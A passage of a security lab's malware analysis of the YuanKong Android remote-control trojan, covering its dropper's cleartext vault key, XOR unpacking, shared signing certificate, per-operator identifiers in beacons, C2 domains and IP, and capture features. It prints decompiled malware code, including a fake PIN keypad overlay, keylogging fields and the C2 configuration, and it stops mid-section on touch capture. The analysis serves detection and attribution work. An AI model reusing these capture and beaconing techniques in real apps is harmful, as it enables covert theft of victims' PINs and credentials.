---
title: "YuanKong RAT: the Android remote-control service that stamps its operators' names into every build | STAR Labs"
source: https://starlabs.sg/blog/2026/10-yuankong-rat-the-android-remote-control-service-that-stamps-its-operators-names-into-every-build/
source_host: starlabs.sg
clip_date: 2026-10-16T00:07:22+08:00
trace_id: 2d2863c8-537d-464f-8e50-9ec36a44a29a
content_hash: c57f2ec97867e5a05999807e14cbc0190ba105b7e560028b6f158eb77aa9c1ba
status: synced
tags:
  - 恶意样本
  - Android逆向
series: null
feed_source: STAR Labs·漏洞研究
ai_summary: 安卓远控家族 YuanKong 把解密密钥明文放在 assets 里，又把运营商身份硬编码进每个 APK 并随信标回传，静态一扫即可还原 42 个账号。
ai_summary_style: key-points
images_status:
  total: 27
  succeeded: 27
  failed_urls: []
notion_page_id: 3fa75244-d011-814a-b998-c73eba34fcff
ioc:
  cves: []
  cwes: []
  hashes:
    - 12480408006dece2fa756b3572766eecb6fb2144a1226f4e21c4cb7d54383105
    - 2fe7803a60175e27d8a2934c020e6413
    - 4280a408a7f0490d9d2eaa3f536f339b
    - 5e4d1980f76e571dd0300b9fa356818f874528fc0517d0d0e0afb7e561904764
    - 5f682a13639b6234bc5dbee43c24085140b4ccacd558884c1460352072d3157f
    - 675d083b63e2169e8fd0ac0cfd27904005b5e2be00f6e3489f6e47fc4c57a4d1
    - 73cbe8e3730cacfdd208f22eab468bb5495a78c0eb2cb37eff5af0cafe321387
    - af92f7d616564dabffb0679a1a38fb24d6a6c4e4a90114c6eb0834c57dd456c9
    - b94b2608c3b296f521000550c1267bf9
    - d96056e9f00bb82c621be36f6a7c5c1f47cce61d11be141ee976c0092c8693b1
  domains:
    - apppanda.xyz
    - ktx123.net
    - ktxapp.com
    - www.ktx123.net
    - www.ktxapp.com
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 安卓远控家族 YuanKong 把解密密钥明文放在 assets 里，又把运营商身份硬编码进每个 APK 并随信标回传，静态一扫即可还原 42 个账号。
> 
> - **解密无门槛：** `assets/vault-config.json` 明文存有算法标签 SVLT-XOR-v2、base64 密钥与 hex IV；容器为 "SVLT"+版本+IV 长度+IV+密文，解密只是 key/IV 循环异或，产物为 ZIP，纯静态即可取出子 APK。
> - **家族锚点：** 110 个 dropper 解出的 57 个子载荷全部由同一证书签名（SHA-256 73cbe8e3…321387，O=YuanKong），包名、品牌、账号每构建轮换，应按签名者狩猎而非包名。
> - **多租户归因：** `apkAccountId`、`apkAccountName`、六位注册码均为 DEX 字符串常量，并随前台应用信标回传（apkOwnerSource="apk build"），据此提取出 42 个运营商账号、44 个品牌。
> - **C2 与提权：** 共享 C2 为 apppanda[.]xyz、ktxapp[.]com、ktx123[.]net、206.82.1.14，走 Socket.IO over WebSocket，仅有 TLS 无应用层密钥；子样本用 libadb-android SPAKE2 自配对 127.0.0.1:5555，pm grant WRITE_SECURE_SETTINGS 并落地 daemon 脚本，提权到 shell（uid 2000）而非 root。
> - **窃取面：** 不申请短信/通讯录/相机/麦克风权限，靠截屏推流、无障碍树读文本（含密码字段）、键盘记录、PIN 与支付口令捕获、剪贴板/通知 OTP/文件/定位。

Most Android RATs try hard to hide their server. This one barely hides anything and that turns out to be the interesting part. The dropper leaves the key under the mat: a `vault-config.json` sitting in `assets/` right next to the ciphertext it unlocks, holding the key and IV in cleartext.

![jadx, the dropper’s assets/vault-config.json open in the decompiler: SVLT-XOR-v2 with the base64 key, hex IV, encrypted asset name and the child’s original SHA-256, all in cleartext](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/db38251e9c258f34.png)

The child it unpacks is an overlay and remote-control app signed `O=YuanKong` (“YuanKong” / 远控, the Chinese abbreviation of 远程控制, “remote control”). It is multi-tenant in a concrete, checkable way: across our set of 110 droppers, 57 distinct child payloads are all signed by one shared certificate (`73cbe8e3730cacfdd208f22eab468bb5495a78c0eb2cb37eff5af0cafe321387`) and call one shared C2 set, yet each build carries its own operator account identifiers (`apkAccountId`, `apkAccountName`, a per-build enrollment code) as string constants and the beacon tags them `apkOwnerSource = "apk build"`. Those identifiers resolve to 42 distinct operator accounts. One shared codebase, partitioned into per-operator accounts, is what multi-tenant means here, shown in the decompiler in sections 05 and 11. And the malware reports those identifiers to its C2 on every foreground-app event, so tear down one sample properly and you do not just get one operator; you get the roster.

This post tears down one sample end to end with jadx, the dropper `675d083b63e2169e8fd0ac0cfd27904005b5e2be00f6e3489f6e47fc4c57a4d1` (operator `lichunfeng7`), then uses the fields that single-sample teardown exposes to pull 42 distinct operator accounts and 44 rotating build brands out of our collection of 110 YuanKong droppers. Every finding about YuanKong below comes from our own binaries: the decompiled source, the signing certificates, the resources. The only third-party references are a few explicit, cited comparisons to other families (RedHook, RatHat), included for contrast and attributed where they appear.

## Key findings

-   **The dropper hands you the key.** The outer app (`com.system.loader.va363d031`, signed `O=Nova`, `CN=Nova Build 20260703113341`) stores its payload key and IV in cleartext in `assets/vault-config.json`. No native unpacker, no server round-trip. The vault is self-describing. (jadx: the `vault-config.json` figure above and section 01.)
-   **“SVLT-XOR-v2” is a two-key XOR, not real crypto.** The decrypt is `plain[i] = cipher[i] ^ key[i % keylen] ^ iv[i % ivlen]`, over a `"SVLT"` -magic container. The plaintext is a ZIP; the child APK is lifted straight out of it. (jadx: `svltDecrypt` and `extractChildApk` in section 02.)
-   **The child is YuanKong and every tenant shares one certificate.** The unpacked app `com.remote.control.RemoteControlApp` is signed `CN=Remote Control, OU=Dev, O=YuanKong, L=Beijing, C=CN`. The same certificate (`73cbe8e3730cacfdd208f22eab468bb5495a78c0eb2cb37eff5af0cafe321387`) signs all 57 distinct payloads in our set, a strong family anchor. (jadx: the certificate in section 03 and the same certificate on a second operator’s sample in section 11.)
-   **Operator identity is baked into the binary.** The config class exposes `apkAccountId` (e.g. `account_mulcetn2_9d226b242cac`), `apkAccountName` (the operator’s handle, e.g. `lichunfeng7`) and a per-build six-digit `enrollment_code`. These are not server-side secrets. They are string constants in the DEX. (jadx: `k4.l3.e()` / `f()` in section 05 and a second operator’s `k4.i2.e()` / `f()` in section 11.)
-   **The malware reports those identifiers home.** The foreground-app beacon packs `apkAccountId`, `apkAccountBindId`, `apkAccountName` and `apkOwnerSource` into the very payload it sends to the relay. The RAT tells the panel and us, which tenant it belongs to. (jadx: the beacon payload array in section 07.)
-   **The C2 channel is Socket.IO over WebSocket, with no app-layer key.** The child holds a persistent `io.socket` WebSocket (okhttp) to a host in the shared set (`apppanda[.]xyz`, `ktxapp[.]com`, `ktx123[.]net`, `206.82.1.14`), exchanging typed JSON `ControlMessage` s; confidentiality is TLS only. (jadx: the host set in section 08.)
-   **It steals by watching and driving the screen, not through content providers.** It declares no SMS, contacts, call-log, camera or microphone permission. Instead it screen-captures and streams, reads the accessibility tree including password fields, arms payment-PIN capture and takes clipboard, notifications/OTP, files and location. (jadx: section 09.)
-   **It escalates to an ADB shell on the device itself.** It enables Wireless Debugging and self-pairs with the local `adbd` (this is what the SPAKE2 code is for, not the C2), then grants itself `WRITE_SECURE_SETTINGS` and installs an unkillable daemon. Escalation to the `shell` user, not root. (jadx: section 10.)
-   **Two different signing identities.** The packer certificate says Singapore (`O=Nova, OU=APK Factory, C=SG`); the RAT certificate says Beijing (`O=YuanKong, C=CN`). The split is consistent across the whole set. (jadx: the two certificates in sections 01 and 03.)

> \[!WARNING\] The three C2 domains and the IP below are the malware’s C2 host set, confirmed across every sample and recommended for blocking. The package-name strings in the config class `k4.l3` field `f5672e` (`com.netflixgratis.app`, `io.litetube.app` and so on) are not the malware’s own package and are not C2; in this build they are used only as seed material by the device-identity generator `p()` (section 06). Do not treat them as indicators to block.

## Technical analysis

The sample I am tearing down is the dropper `675d083b63e2169e8fd0ac0cfd27904005b5e2be00f6e3489f6e47fc4c57a4d1` (`4280a408a7f0490d9d2eaa3f536f339b`), which unpacks the child `net.echorelay.app` (`12480408006dece2fa756b3572766eecb6fb2144a1226f4e21c4cb7d54383105`). I picked it because its operator fields are fully populated (`apkAccountName=lichunfeng7`), so you can watch an attributable identity travel from a string constant all the way to the wire.

### 01 The Nova dropper and its self-describing vault

The outer APK is a thin loader. Its signing block is the first tell: a throwaway identity with a build-stamped common name.

![jadx, dropper APK signature: CN=Nova Build 20260703113341, OU=APK Factory, O=Nova, L=Singapore, C=SG](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/122f0af158c39182.png)

*Dropper signer. The `CN` contains the digits `20260703113341`, which read as 2026-07-03 11:33:41; the certificate’s valid-from is 2026-07-03 03:33:41 UTC. The org claims an “APK Factory” in Singapore. This certificate (`af92f7d616564dabffb0679a1a38fb24d6a6c4e4a90114c6eb0834c57dd456c9`) is the packer’s identity, not the RAT’s.*

Everything the loader needs to unpack its payload is sitting in `assets/vault-config.json`, in the clear (shown in the decompiler in the screenshot above):

```json
// jadx, verbatim, assets/vault-config.json
{
    "vault_format_version": "2.0",
    "encryption": {
        "algorithm": "SVLT-XOR-v2",
        "key_b64": "llVA7rB25/MzrmZJD4A/P23Ef8Isoc2rRm5xIhbgo6I=",
        "iv_hex": "b94b2608c3b296f521000550c1267bf9"
    },
    "asset": {
        "name": "cx58vmnqxuh6059a",
        "original_hash": "12480408006dece2fa756b3572766eecb6fb2144a1226f4e21c4cb7d54383105"
    },
    "payload": {
        "type": "apk",
        "path": "payload/child.apk",
        "verify_signature": true,
        "install_after_decrypt": true
    }
}
```

This single file gives up the whole scheme: the algorithm label, the base64 key, the hex IV, the name of the encrypted blob (`assets/cx58vmnqxuh6059a`) and the SHA-256 the plaintext is supposed to match once decrypted. `install_after_decrypt: true` states what happens next. There is no key derivation and no anti-analysis gate. The config is the secret.

### 02 The “SVLT” container and the two-key XOR

The decrypt routine lives in `com.system.loader.va363d031.InstallHelper.svltDecrypt`. It parses a small header, then XORs.

![jadx, InstallHelper.svltDecrypt: SVLT magic check, version, IV length, base64 key](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b5629688ff3ea83f.png)

```java
// jadx, verbatim, InstallHelper.svltDecrypt(byte[] bArr, String str)
if (bArr[0] == 83 && bArr[1] == 86 && bArr[2] == 76 && bArr[3] == 84) {   // 'S' 'V' 'L' 'T'
    int i2 = bArr[4] & UByte.MAX_VALUE;   // format version
    int i3 = bArr[5] & 255;               // IV length
    if (i2 != 2 || i3 <= 0 || bArr.length <= (i = i3 + 6)) {
        throw new Exception("Unsupported SVLT vault version");
    }
    byte[] bArr2 = new byte[i3];
    System.arraycopy(bArr, 6, bArr2, 0, i3);   // IV := bytes[6 .. 6+ivlen]
    try {
        bytes = Base64.decode(str, 0);          // key := base64(key_b64)
    } catch (IllegalArgumentException unused) {
        bytes = str.getBytes(StandardCharsets.UTF_8);
    }
    if (bytes.length == 0) {
        throw new Exception("Empty SVLT vault key");
    }
    int length = bArr.length - i;
    byte[] bArr3 = new byte[length];
    for (int i4 = 0; i4 < length; i4++) {
        bArr3[i4] = (byte) ((bArr[i + i4] ^ bytes[i4 % bytes.length]) ^ bArr2[i4 % i3]);
    }
    return bArr3;
}
```

The container is `"SVLT"` + `version(1)` + `ivlen(1)` + `IV(ivlen)` + `ciphertext`. Our blob’s header is `53 56 4C 54 02 10 b9 4b…`: version `2`, IV length `0x10` (16), IV beginning `b94b2608c3b296f521000550c1267bf9`, which matches `iv_hex` in the config exactly. The transform is a byte-wise XOR against the key and the IV; recovering the plaintext needs nothing but the config.

The decrypted bytes are a ZIP and the loader pulls the child APK out of it:

![jadx, the XOR loop and extractChildApk pulling the child APK from the decrypted ZIP](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d292d173e072e9d7.png)

```java
// jadx, verbatim, InstallHelper.extractChildApk(byte[] bArr)
if (bArr.length >= 2 && bArr[0] == 80 && bArr[1] == 75) {   // 'P' 'K', ZIP
    ZipInputStream zipInputStream = new ZipInputStream(new ByteArrayInputStream(bArr));
    do {
        nextEntry = zipInputStream.getNextEntry();
        if (nextEntry == null) {
            zipInputStream.close();
            throw new Exception("Vault child APK entry is missing");
        }
        // ... walk entries until payload/child.apk ...
```

Reproducing it statically is a few lines of Python:

```python
# python, static unpack, no execution
iv  = bytes.fromhex("b94b2608c3b296f521000550c1267bf9")
key = base64.b64decode("llVA7rB25/MzrmZJD4A/P23Ef8Isoc2rRm5xIhbgo6I=")
blob = open("assets/cx58vmnqxuh6059a","rb").read()
assert blob[:4] == b"SVLT" and blob[4] == 2
ivlen = blob[5]; iv_hdr = blob[6:6+ivlen]; ct = blob[6+ivlen:]
plain = bytes(ct[i] ^ key[i % len(key)] ^ iv_hdr[i % ivlen] for i in range(len(ct)))
# plain is a ZIP; payload/child.apk has SHA-256 12480408006dece2fa756b3572766eecb6fb2144a1226f4e21c4cb7d54383105 (matches original_hash)
```

### 03 The YuanKong child and its shared certificate

The extracted child is `net.echorelay.app`, application class `com.remote.control.RemoteControlApp`. Its signing certificate is the family anchor (the same certificate signs every tenant’s build, so it is the most reliable way to recognise the family):

![jadx, child APK signature: CN=Remote Control, OU=Dev, O=YuanKong, L=Beijing, C=CN; SHA-256 73cbe8e3730cacfdd208f22eab468bb5495a78c0eb2cb37eff5af0cafe321387](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7a7f37860a5c5526.png)

```text
# jadx, child APK signature (v2 and v3)
Subject:   CN=Remote Control, OU=Dev, O=YuanKong, L=Beijing, ST=Beijing, C=CN
Serial:    0xc8f480c186f56f68
Valid:     Thu Mar 05 12:23:06 UTC 2026  to  Mon Jul 21 12:23:06 UTC 2053
Key:       RSA 2048, SHA256withRSA
SHA-256:   73 CB E8 E3 73 0C AC FD D2 08 F2 2E AB 46 8B B5 49 5A 78 C0 EB 2C B3 7E FF 5A F0 CA FE 32 13 87
```

Two things matter here. First, `O=YuanKong` plus the `com.remote.control.*` class namespace names the product. Second and this is what makes it a reliable family signal, the same certificate `73cbe8e3730cacfdd208f22eab468bb5495a78c0eb2cb37eff5af0cafe321387` signs all 57 distinct child payloads in our collection. The operators rotate package names, brands and account IDs on every build, but they all sign with the one key. That single shared certificate is the thread that ties the whole multi-tenant set together.

### 04 The configuration class: C2, seed packages, enrollment, device brands

The child’s settings live in one obfuscated class, `k4.l3`. jadx renames the fields but the structure is plain:

![jadx, class k4.l3 field declarations](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/595e26a97f9ee381.png)

```java
// jadx, k4.l3 (field map)
public static final b1.x0        f5670c;   // prefs helper
public static final List         f5671d;   // device tags      (rotating "<brand>-device-v2")
public static final List         f5672e;   // imitation app-name seed list (see p(), section 06)
public static final String       f5673f;   // C2 URL
public static final String       f5674g;   // enrollment code
public final Context             f5675a;
public final SharedPreferences   f5676b;
```

The static initialiser fills them in and this is where the per-build personality lives:

![jadx, k4.l3 static block: device tags, seed-package list, C2 URL, enrollment 863456](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/755ab14ce0572ce6.png)

```java
// jadx, verbatim, k4.l3 static { ... }
f5671d = p1.h0.x("echorelay-device-v2", "protube-device-v2");
f5672e = p1.h0.x("com.netflixgratis.app", "io.litescreen.app", "org.proclip.app",
                 "org.hdviewer.app", "io.litetube.app", "com.quickp…");
f5673f = u3.a("https://ktxapp.com", "https://ktxapp.com");
String k8 = b1.x0.k(x0Var, "863456");   // this build's enrollment code
if (k8 == null) {
    k8 = "123456";                      // factory-default fallback
}
f5674g = k8;
```

`f5671d` holds the build’s rotating device brand (`echorelay-device-v2`) alongside a constant `protube-device-v2`. `f5672e` is a fixed list of imitation app-package names (`com.netflixgratis.app`, `io.litetube.app` and so on); it is used only as seed material by the device-identity generator `p()` (section 06), not as an attack target or a watch list. `f5673f` is the configured C2 URL. And `f5674g` is the enrollment code, `863456` for this build, with `123456` as the fallback when a build was produced without one.

### 05 Operator identity is a string constant

This is the part that turns a single teardown into an attribution dataset. The config class exposes three static getters whose return values are hard-coded in the DEX:

![jadx, k4.l3.e() returns account\_mulcetn2\_9d226b242cac, f() returns lichunfeng7](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/016c24e27ee69716.png)

```java
// jadx, verbatim, k4.l3
public static String d() { return f5674g; }                              // enrollment code
public static String e() { return f5.n.A0("account_mulcetn2_9d226b242cac").toString(); }  // apkAccountId
public static String f() { return f5.n.A0("lichunfeng7").toString(); }    // apkAccountName (operator handle)
public static void   g() { f5.n.Z("apk_build"); }                         // owner source tag
```

-   `e()` returns `apkAccountId` = `account_mulcetn2_9d226b242cac`. The shape is `account_<8-char token>_<12-hex>`.
-   `f()` returns `apkAccountName` = `lichunfeng7`, the operator’s handle in the YuanKong panel.
-   `d()` returns the six-digit enrollment code (`f5674g`), `863456` for this build. In the beacon it is reported as `apkAccountBindId`.

None of this is fetched from the server. It is compiled in, which means every YuanKong build carries a record of which account produced it.

What the enrollment code is for: it is the token that binds a freshly infected device to a specific operator account and campaign, on the YuanKong panel. When an operator generates a build the panel stamps the code into it; the `123456` seen on some builds is the factory default a build carries when it was produced without one. There are in fact two related fields and they are not the same thing:

-   `apkAccountBindId` is the enrollment code compiled into the APK (`l3.f5674g`, the `863456` / `123456` above). It is fixed for the build.
-   `accountBindId` is the bind value actually in force at runtime, read by `l3.c()` from the `account_bind_id` preference. That preference can be set per install from the launch intent, a deep link carrying `accountBindId`, or an `enrollmentToken` in the server URL (`MainActivity.applyLaunchAccountBindId` persists it) and it falls back to the compiled-in `apkAccountBindId` when nothing was supplied.

The beacon carries both (`ConnectionService.reportForegroundPackage` sets `accountBindId = l3.c()` and `apkAccountBindId = l3.f5674g`), so the panel can file each new victim under the right account even when one build is seeded to several campaigns: `apkAccountBindId` says which build produced the infection, `accountBindId` says which enrollment the device actually joined.

### 06 Device-identity fingerprinting

Before it beacons, the child builds a “stable device fingerprint” and persists it in both normal and device-protected (direct-boot) storage so it survives a reboot before first unlock:

![jadx, stable fingerprint persistence and the p() identity generator](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1248986feb77c518.png)

```java
// jadx, k4.l3 fingerprint helpers
public final String o() {
    String s = this.f5676b.getString("device_id_source", "stable_fingerprint_hardware_v3");
    return s == null ? "stable_fingerprint_hardware_v3" : s;
}

public final ArrayList p() {
    List<String> Y = n4.q.Y(n4.q.o0(f5672e, this.f5675a.getPackageName()));  // f5672e seed list + own package
    ArrayList out = new ArrayList();
    for (String pkg : Y) {
        for (String tag : f5671d) {                        // device tags
            String b8 = b(pkg, tag);                        // derived fingerprint
            out.add(n4.x.N(new m4.d("packageName", pkg),
                           new m4.d("stableFingerprint", b8),
                           new m4.d("deviceId", "android_".concat(/* … */))));
        }
    }
    // de-dup on stableFingerprint …
}
```

The identity is persisted under `stable_device_fingerprint` (version `3`) and mirrored into a `remote_control_direct_boot` preference store, keyed to `device_id_source = stable_fingerprint_hardware_v3`. The result is a device ID the panel can use to recognise the same victim across reboots and reinstalls. Across the whole child, `f5672e` is referenced only here, so its one role is to seed these synthetic identities, not to mark attack targets.

### 07 The foreground-app beacon and the full telemetry schema

Everything comes together in `com.remote.control.service.ConnectionService$reportForegroundPackage`, which fires on foreground-app changes and assembles the beacon as an array of key/value pairs:

![jadx, reportForegroundPackage payload fields, part 1: deviceId to accountBindId](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/313b165622e692a7.png) ![jadx, reportForegroundPackage payload fields, part 2: apkAccountId, apkAccountBindId, apkAccountName, apkOwnerSource](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d0db89950b35129e.png)

```java
// jadx, verbatim, ConnectionService$reportForegroundPackage$1 (payload array)
dVarArr[0]  = new m4.d("deviceId",                l3Var.i());
dVarArr[1]  = new m4.d("coreOnly",                Boolean.TRUE);
dVarArr[2]  = new m4.d("presenceOnly",            Boolean.FALSE);
dVarArr[3]  = new m4.d("presenceReason",          "foreground-app:" + this.$source);
dVarArr[4]  = new m4.d("reportedAt",              new Long(this.$now));
dVarArr[5]  = new m4.d("installInstanceId",       l3Var2.k());
dVarArr[6]  = new m4.d("stableFingerprint",       l3Var3.n());
dVarArr[7]  = new m4.d("stableFingerprintSource", l3Var4.o());
dVarArr[8]  = new m4.d("deviceName",              l3Var5.j());
dVarArr[9]  = new m4.d("packageName",             this.this$0.getPackageName());
dVarArr[10] = new m4.d("accountBindId",           l3Var6.c());
dVarArr[11] = new m4.d("apkAccountId",            l3.e());     // account_mulcetn2_9d226b242cac
dVarArr[12] = new m4.d("apkAccountBindId",        l3.f5674g);  // enrollment code 863456
dVarArr[13] = new m4.d("apkAccountName",          l3.f());     // lichunfeng7
dVarArr[14] = new m4.d("apkOwnerSource",          "apk build");
```

Read it as a schema. The first block is victim and device telemetry: a `deviceId`, the `stableFingerprint` and its `…Source`, a `deviceName`, the foreground `packageName` that triggered the report, an `installInstanceId` and a `reportedAt` timestamp. The second block is account binding: `accountBindId`, then the three fields that identify the operator (`apkAccountId`, `apkAccountBindId` the enrollment code and `apkAccountName`), closed off with a constant `apkOwnerSource = "apk build"` that marks where those values came from.

That is the whole point of this write-up in one array. The RAT’s own beacon carries the operator’s identity, so once you can read one build you can read every build’s owner without ever touching the panel.

### 08 The C2 host set and transport

The C2 is not a single hard-coded host. Three C2 domains are defined in `k4.u3`, two of which also carry a `www.` alias:

![jadx, k4.u3 host set: apppanda.xyz as a single-element set via c.T, ktxapp.com and ktx123.net as two-element sets via c.U that add the www aliases](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/630eb4e8e1c02b9d.png)

```java
// jadx, verbatim, k4.u3
public abstract class u3 {
    public static final Set f5871a = com.bumptech.glide.c.T("apppanda.xyz");
    public static final Set f5872b = com.bumptech.glide.c.U("ktxapp.com",  "www.ktxapp.com");
    public static final Set f5873c = com.bumptech.glide.c.U("ktx123.net",  "www.ktx123.net");
    public static String a(String str, String str2) { /* URI.create-based host selection */ }
}
```

The two set builders are not interchangeable: `com.bumptech.glide.c.T` wraps a single element (`Collections.singleton`), so `f5871a` is just `apppanda.xyz` with no alias, while `com.bumptech.glide.c.U` takes a vararg, so `f5872b` and `f5873c` each hold a domain plus its `www.` alias. The configured URL in `k4.l3` (`https://ktxapp.com`) is one entry into this set; the same three domains (two with a `www.` alias) and the hardcoded IP `206.82.1.14` appear across every tenant. A DNS check on 2026-10-15, from this analysis environment, resolved `ktxapp.com`, `ktx123.net` and their `www.` aliases to `206.82.1.14`, the same IP hardcoded in the binary. `apppanda.xyz` did not resolve from that vantage, which is not conclusive (a host can be dormant, parked, filtered at one vantage, or geo-split) and does not lower its value as an indicator. Whether the panel is actively serving was not tested. The channel itself is **Socket.IO** (engine.io) carried over a WebSocket via okhttp (`io.socket.client.Socket`), so the child holds a persistent connection to the panel rather than polling. Messages are a typed JSON `ControlMessage` with a `MessageType`: the enum opens with `AUTH` (the handshake), then `HEARTBEAT` keep-alives and `RELIABLE_DATA_BATCH` / `RELIABLE_DATA_ACK` for chunked binary such as screen frames and files. There is no application-layer encryption of these messages: a search for `Cipher` or `SecretKeySpec` under `com.remote.**` returns nothing, so confidentiality rests on TLS (the `https` / `wss` endpoint). The handshake carries the device and operator identity (the same `apkAccountId` / `deviceId` / fingerprint fields), not a crypto key, which is why there is no C2 key to extract.

### 09 What it collects and controls

The child’s capabilities are enumerated in its own command protocol. `com.remote.control.model.MessageType` defines roughly ninety panel-to-child commands and child-to-panel reports and `ConnectionService$onMessageReceived` routes each one to a `handle*` method. Grouped by what they take:

-   **The screen.** `IMAGE_FULL`, `IMAGE_THUMBNAIL`, `CAPTURE_UI_TREE`, `ENABLE_BLACK_SCREEN` / `DISABLE_BLACK_SCREEN`, `PAUSE_SCREEN_TRANSPORT`. It screenshots and live-streams the display and can black out the screen while it operates.
-   **Credentials and PINs.** `ARM_PIN_CAPTURE`, `ARM_PAYMENT_CAPTURE`, `GET_PAYMENT_PIN_REPORT`, `PAYMENT_PIN_REPORT`, `PIN_INPUT`, `PIN_INPUT_RESULT`, plus a keyboard logger (`KEYBOARD_LOGGER_SETTINGS`, `KEY_INPUT`, `KEYBOARD_ALLOWLIST_LEARN_*`).
-   **On-screen content.** Through accessibility (`AccessibilityNodeInfo`, `getText`, `findAccessibilityNodeInfosByText` and `isPassword` for password fields) it reads whatever is on screen in any app.
-   **Remote control.** `CLICK`, `LONG_CLICK`, `GESTURE`, `KEY_INPUT`, `BACK`, `HOME`, `RECENTS`, `LAUNCH_APP`, `LOCK_SCREEN`.
-   **Files.** `FILE_LIST`, `FILE_DOWNLOAD`, `FILE_UPLOAD`, `FILE_DELETE`, `FILE_RENAME`, `FILE_CREATE_FOLDER`, `FILE_TRANSFER_FETCH`, over `/api/file-transfers/nodes/` as `application/octet-stream`, with `MANAGE_EXTERNAL_STORAGE` and `READ_MEDIA_IMAGES/VIDEO/AUDIO`.
-   **Clipboard, notifications, location.** `CLIPBOARD_SYNC` / `CLIPBOARD_UPDATE`; `APP_NOTIFICATION_EVENT` / `DISMISS_APP_NOTIFICATION` (reads and dismisses notifications, including one-time codes); `GET_LOCATION` / `LOCATION_RESULT` with `ACCESS_FINE_LOCATION`.
-   **Recon and persistence.** `DEVICE_INFO`, `GET_APP_LIST`, `GET_PERMISSION_STATUS`, `ANTI_UNINSTALL_ENABLE`, `HIDE_APP_ICON`, `REQUEST_SELF_UNINSTALL` and the `LOCAL_ADB_*` family (next section).

The command list is the menu. The mechanisms are in `RemoteAccessibilityService` (the 1.5 MB actuator) and the capture controllers and they are worth seeing, because the method is what makes it dangerous rather than the permission set.

**Remote input** is accessibility gesture injection: `handleGesture` scales the panel’s normalized `points` to the screen, builds a `GestureDescription` and calls `dispatchGesture(...)`. Once escalated it can instead drive the local ADB shell’s `input`.

!\[jadx, remote input: performClick builds a Path into a GestureDescription.StrokeDescription and calls dispatchGesture(build, null, null)\]/blog/2026/images/YuanKong-RAT-16-input-dispatchgesture.png)

**Screen** has two backends. The MediaProjection path (`HiddenScreenCaptureController`) pairs capture with a mask overlay that hides the cast indicator; the ADB path (`AdbScreenCaptureController`) runs the device’s own `screenrecord` over the local ADB session and streams H.264 (an Annex-B parser, `H264AnnexBAccessUnitParser`, reassembles access units), which needs no consent prompt.

![jadx, AdbScreenCaptureController: the adb\_screenrecord\_h264 transport mode, H264 frame parameters and the physicalMaskActive capture mask](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6f8ee68857aa9baf.png)

**Keylogging** is accessibility text-change capture, not just the keyboard. Each edit becomes a `KeyInputRecord`:

```java
// jadx (CLI decompile), verbatim, RemoteAccessibilityService.keyInputRecordToMap
"text", "appPackage", "appName", "inputField", "action",
"beforeText", "afterText", "fromIndex", "addedCount", "removedCount",
"eventType", "sequence", "timestamp"
```

Those are the fields of a `TYPE_VIEW_TEXT_CHANGED` accessibility event, so it logs every text-field edit in every app, with the field identity and the before/after text. `RemoteInputMethodService.commitText` separately lets the operator type remotely.

![jadx, keyInputRecordToMap: the keylog record serialized with text, appPackage, appName and the full text-change fields](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ea9ea95d4afaa18d.png)

**PIN capture** works two ways. It draws its own numeric keypad overlay whose touch handler maps each tap to the real digit while the visible display shows masked dots:

```java
// jadx (CLI decompile), verbatim, RemoteAccessibilityService, fake-keypad overlay
public boolean onTouchEvent(MotionEvent motionEvent) {
    float x7 = motionEvent.getX(); float y7 = motionEvent.getY();
    for (m4.d next : this.keyRects) {
        RectF rectF = (RectF) next.f6636e;
        String str = (String) next.f6637f;          // the real digit for this key rect
        if (rectF.contains(x7, y7)) { handleKey(str); break; }
    }
    return true;
}
// ... handleKey -> appendChar:
remoteAccessibilityService.pinCaptureBuffer.append(str);   // real PIN accumulates; UI shows dots
```

Against the app’s real keypad instead, `cacheDigitButtonLayout` scans the accessibility tree for the ten digit buttons, caches their screen rectangles (exactly ten, gated by `validatePinKeymap`) and reconstructs taps from coordinates.

![jadx, buildPasswordMaskView appendChar: appends the real digit to pinCaptureBuffer while updateDisplay shows masked dots](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/655df5435f78010e.png)

**Capturing touches without `/dev/input`.** A sibling banking family, RatHat, reaches the same prize a different way, as Zimperium documented ([Zimperium, 2026-09-16](https://zimperium.com/blog/rathat-ai-powered-mobile-threat-is-here-for-your-credentials-bank-accounts)): it uses its ADB shell to run `getevent`, which reads the kernel’s raw touch stream from `/dev/input/*` (coordinates and a timestamp for every touch, system-wide, which a normal app cannot read but shell UID 2000 can). YuanKong never does this. There is no `getevent`, `/dev/input`, `sendevent`, or `ABS_MT_POSITION` anywhere in the APK, including both native libraries (the only two are `libconscrypt_jni.so` and `libspake2.so`). Although it holds the same ADB `shell` user (uid 2000, section 10) that `getevent` would need, it spends that shell on input injection (`input tap` / `swipe` / `keyevent`), `screenrecord`, `pm grant` and captures the victim’s own taps at the Android API layer instead, in three parts.

First, it learns the keypad’s geometry from the accessibility tree. `cacheDigitButtonLayout` walks every window, collects each digit button’s on-screen rectangle into a digit-to- `Rect` map and only accepts a layout once it has found exactly ten buttons:

![jadx, cacheDigitButtonLayout: builds a digit to on-screen Rect map from the accessibility tree, gated on ten digits](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0ef254ee123010e8.png)

Second, it reads raw touch coordinates at the window layer, not the kernel. Its black-screen remote-control overlay installs a `WindowManager` touch blocker whose handler consumes each touch-down and reads `motionEvent.getRawX()` / `getRawY()`:

![jadx, addBlackScreenTouchBlockerRect touch handler: reads motionEvent.getRawX()/getRawY() on each touch-down](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e1c6e1fcda612a72.png)

